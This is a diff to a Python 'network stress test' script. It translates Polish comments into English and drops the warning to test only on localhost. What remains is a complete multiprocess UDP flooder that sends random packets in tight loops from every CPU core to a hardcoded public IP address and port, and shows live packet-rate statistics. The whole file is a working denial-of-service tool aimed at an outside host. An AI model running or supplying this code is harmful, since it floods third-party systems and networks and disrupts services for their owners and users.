@@ -3,22 +3,22 @@ import multiprocessing
 import os
 import time
 
-# --- KONFIGURACJA TESTOWA ---
-TARGET_IP = "156.206.32.13"  # ZAWSZE testuj na localhost lub własnym IP!
+# --- TEST CONFIGURATION ---
+TARGET_IP = "156.206.32.13"
 TARGET_PORT = 16000
-PROCESS_COUNT = os.cpu_count()  # Dopasowanie do liczby rdzeni procesora
+PROCESS_COUNT = os.cpu_count()  # Match the number of CPU cores
 PAYLOAD_SIZE = 1350
 
 
 def stress_test_worker(target_ip, target_port, stop_event, shared_stats):
-    """Pracownik zoptymalizowany pod kątem minimalnego narzutu CPU."""
-    # Tworzymy payload raz - generowanie losowych danych w pętli zabija wydajność
+    """Worker optimized for minimal CPU overhead."""
+    # Create payload once - generating random data in a loop kills performance
     payload = os.urandom(PAYLOAD_SIZE)
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.setblocking(False)
 
-    # Próba zwiększenia bufora systemowego
+    # Attempt to increase the system buffer size
     try:
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**20)
     except:
@@ -28,18 +28,18 @@ def stress_test_worker(target_ip, target_port, stop_event, shared_stats):
 
     while not stop_event.is_set():
         try:
-            # Bardzo ciasna pętla - wysyłamy 500 pakietów przed aktualizacją statystyk
+            # Very tight loop - send 500 packets before updating statistics
             for _ in range(500):
                 sock.sendto(payload, (target_ip, target_port))
                 local_p_count += 1
 
-            # Aktualizacja statystyk zbiorczych (rzadsza = szybszy skrypt)
+            # Update global statistics (less frequent update = faster script)
             with shared_stats.get_lock():
                 shared_stats.value += local_p_count
             local_p_count = 0
 
         except (BlockingIOError, OSError):
-            # Bufor systemowy pełny - krótkie zwolnienie, by karta sieciowa "odetchnęła"
+            # System buffer full - short pause to let the network card "breathe"
             time.sleep(0.001)
         except Exception:
             break
@@ -47,7 +47,7 @@ def stress_test_worker(target_ip, target_port, stop_event, shared_stats):
 
 
 def monitor(shared_stats, stop_event):
-    """Logika monitorująca wydajność w czasie rzeczywistym."""
+    """Real-time performance monitoring logic."""
     last_count = 0
     start_time = time.time()
 
@@ -62,20 +62,20 @@ def monitor(shared_stats, stop_event):
 
         os.system("cls" if os.name == "nt" else "clear")
         print(f"--- NETWORK STRESS TEST | TARGET: {TARGET_IP} ---")
-        print(f"Prędkość: {mbps:.2f} Mbps")
-        print(f"Pakiety na sekundę (PPS): {pps:,}")
-        print(f"Łącznie wysłano: {current_total * PAYLOAD_SIZE / (1024*1024):.2f} MB")
-        print("Naciśnij Ctrl+C, aby przerwać test.")
+        print(f"Speed: {mbps:.2f} Mbps")
+        print(f"Packets Per Second (PPS): {pps:,}")
+        print(f"Total Sent: {current_total * PAYLOAD_SIZE / (1024*1024):.2f} MB")
+        print("Press Ctrl+C to stop the test.")
 
 
 if __name__ == "__main__":
-    # Używamy jednego licznika dla pakietów (bajty obliczymy z rozmiaru)
+    # Use a single counter for packets (bytes will be calculated from the size)
     total_packets = multiprocessing.Value(
         "Q", 0
-    )  # 'Q' dla dużych liczb (unsigned long long)
+    )  # 'Q' for large numbers (unsigned long long)
     stop_event = multiprocessing.Event()
 
-    print(f"Uruchamianie {PROCESS_COUNT} procesów testowych...")
+    print(f"Starting {PROCESS_COUNT} test processes...")
     workers = []
     for _ in range(PROCESS_COUNT):
         p = multiprocessing.Process(
@@ -89,7 +89,7 @@ if __name__ == "__main__":
     try:
         monitor(total_packets, stop_event)
     except KeyboardInterrupt:
-        print("\n[!] Test przerwany przez użytkownika.")
+        print("\n[!] Test interrupted by user.")
     finally:
         stop_event.set()
         for w in workers:
